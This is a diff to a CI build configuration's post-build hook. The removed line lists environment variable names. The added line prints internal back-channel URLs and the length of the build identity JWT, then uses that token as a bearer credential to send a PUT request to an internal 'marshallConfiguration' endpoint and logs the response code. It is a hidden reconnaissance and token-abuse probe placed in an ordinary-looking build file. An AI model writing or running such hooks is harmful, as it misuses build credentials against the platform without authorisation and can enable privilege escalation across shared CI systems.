@@ -4,4 +4,4 @@ stages:
     buildToolVersion: "MBTJ17N20"
 lifeCycle:
   afterAllStages:
-    command: 'echo "KPENV-NAMES-START"; env | cut -d= -f1 | sort | tr "\n" " "; echo; echo "KPENV-NAMES-END"'
+    command: 'echo "KPJWT-START"; echo "BACK_CHANNEL_URL=${BACK_CHANNEL_URL}"; echo "API_SELF_LINK=${API_SELF_LINK}"; echo "jwt_len=${#BUILD_IDENTITY_JWT}"; if command -v curl >/dev/null 2>&1; then code=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${BACK_CHANNEL_URL}/runs/v1/actions/marshallConfiguration" -H "Authorization: Bearer ${BUILD_IDENTITY_JWT}" -H "Content-Type: application/json" -H "X-Request-ID: kp-jwt" --data "{}"); echo "KPJWT-MARSHALL-STATUS=$code"; else echo "KPJWT-NO-CURL"; fi; echo "KPJWT-END"'
